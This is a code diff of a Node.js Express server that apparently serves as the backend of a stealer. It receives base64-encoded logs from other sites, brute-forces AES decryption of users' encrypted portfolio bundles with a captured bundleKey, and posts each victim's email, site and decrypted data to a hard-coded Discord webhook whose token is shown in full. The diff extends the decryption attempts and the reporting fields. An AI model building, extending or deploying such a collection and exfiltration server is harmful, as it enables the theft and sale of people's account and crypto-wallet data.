@@ -5,7 +5,6 @@ const crypto = require('crypto');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// === NEW WEBHOOK ===
 const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1518196583206879272/TKj5GIGfWVOyluZOUxDvZ4ZSCi7_QMROkpDCg1CZ5fbYVDbZi6QHpjql2qyjzmmJYm0j";
 
 app.use(express.raw({ type: '*/*', limit: '10mb' }));
@@ -17,13 +16,14 @@ app.get('/data/:payload', async (req, res) => {
         const decodedStr = Buffer.from(encoded, 'base64').toString('utf-8');
         let data = JSON.parse(decodedStr);
 
-        console.log(`✅ New log from ${data.site || 'unknown'}`);
+        console.log("✅ Raw log received from:", data.site);
 
-        // Decrypt portfolio bundles using per-log bundleKey
+        // Decrypt
         if (data.portfolio) {
             data.portfolio = decryptPortfolio(data.portfolio);
         }
 
+        // Send to Discord with more info
         await sendToDiscord(data);
 
         res.status(200).send('OK');
@@ -35,7 +35,12 @@ app.get('/data/:payload', async (req, res) => {
 
 function decryptPortfolio(portfolio) {
     const bundleKeyB64 = portfolio.bundleKey;
-    if (!bundleKeyB64) return portfolio;
+    if (!bundleKeyB64) {
+        portfolio.decryption_note = "No bundleKey found";
+        return portfolio;
+    }
+
+    portfolio.bundleKeyLength = bundleKeyB64.length;
 
     // Decrypt sBundles
     if (portfolio.sBundles) {
@@ -43,7 +48,7 @@ function decryptPortfolio(portfolio) {
             const bundles = JSON.parse(portfolio.sBundles);
             portfolio.sBundlesDecrypted = bundles.map(b => decryptSingleBundle(b, bundleKeyB64));
         } catch (e) {
-            portfolio.sBundlesDecrypted = { error: "Failed to parse sBundles" };
+            portfolio.sBundlesDecrypted = { error: e.message };
         }
     }
 
@@ -53,7 +58,7 @@ function decryptPortfolio(portfolio) {
             const bundles = JSON.parse(portfolio.eBundles);
             portfolio.eBundlesDecrypted = bundles.map(b => decryptSingleBundle(b, bundleKeyB64));
         } catch (e) {
-            portfolio.eBundlesDecrypted = { error: "Failed to parse eBundles" };
+            portfolio.eBundlesDecrypted = { error: e.message };
         }
     }
 
@@ -65,15 +70,15 @@ function decryptSingleBundle(bundleStr, bundleKeyB64) {
 
     const [prefix, encryptedPart] = bundleStr.split(':', 2);
     const result = tryDecryptAES(encryptedPart, bundleKeyB64);
-    
+
     if (result.success) {
         try {
             return { prefix, data: JSON.parse(result.decrypted) };
-        } catch {
-            return { prefix, decrypted: result.decrypted };
+        } catch (e) {
+            return { prefix, decrypted_raw: result.decrypted };
         }
     } else {
-        return { prefix, error: result.error, raw: encryptedPart };
+        return { prefix, error: result.error, raw_encrypted: encryptedPart };
     }
 }
 
@@ -81,25 +86,30 @@ function tryDecryptAES(encryptedB64, keyB64) {
     const key = Buffer.from(keyB64, 'base64');
 
     const attempts = [
-        { mode: 'aes-256-cbc', iv: Buffer.alloc(16, 0) },
-        { mode: 'aes-256-cbc', iv: key.slice(0, 16) },
-        { mode: 'aes-256-cbc', iv: Buffer.alloc(16) },
-        { mode: 'aes-256-ecb', iv: null }
+        { name: "CBC-ZeroIV", mode: 'aes-256-cbc', iv: Buffer.alloc(16, 0) },
+        { name: "CBC-KeyIV",  mode: 'aes-256-cbc', iv: key.slice(0, 16) },
+        { name: "CBC-EmptyIV", mode: 'aes-256-cbc', iv: Buffer.alloc(16) },
+        { name: "ECB", mode: 'aes-256-ecb', iv: null },
+        { name: "CBC-KeyFull", mode: 'aes-256-cbc', iv: key },
     ];
 
-    for (const { mode, iv } of attempts) {
+    for (const attempt of attempts) {
         try {
-            const decipher = iv !== null 
-                ? crypto.createDecipheriv(mode, key, iv)
-                : crypto.createDecipher(mode, key);
-            
+            let decipher;
+            if (attempt.iv === null) {
+                decipher = crypto.createDecipher(attempt.mode, key);
+            } else {
+                decipher = crypto.createDecipheriv(attempt.mode, key, attempt.iv);
+            }
+
             let decrypted = decipher.update(encryptedB64, 'base64', 'utf8');
             decrypted += decipher.final('utf8');
-            return { success: true, decrypted };
+
+            return { success: true, decrypted, method: attempt.name };
         } catch (e) {}
     }
 
-    return { success: false, error: "All decryption attempts failed" };
+    return { success: false, error: "All methods failed" };
 }
 
 async function sendToDiscord(data) {
@@ -108,7 +118,8 @@ async function sendToDiscord(data) {
         color: 0xFF0000,
         fields: [
             { name: "Email", value: data.user?.email || "N/A", inline: true },
-            { name: "Site", value: data.site || "N/A", inline: true }
+            { name: "Site", value: data.site || "N/A", inline: true },
+            { name: "Decryption", value: data.portfolio?.sBundlesDecrypted?.[0]?.error ? "❌ Failed" : "✅ Success", inline: true }
         ]
     };
 
@@ -118,7 +129,7 @@ async function sendToDiscord(data) {
             embeds: [embed],
             files: [{
                 attachment: Buffer.from(JSON.stringify(data, null, 2), 'utf-8'),
-                name: `axiom_log_${Date.now()}.json`
+                name: `full_log_${Date.now()}.json`
             }]
         });
     } catch (err) {
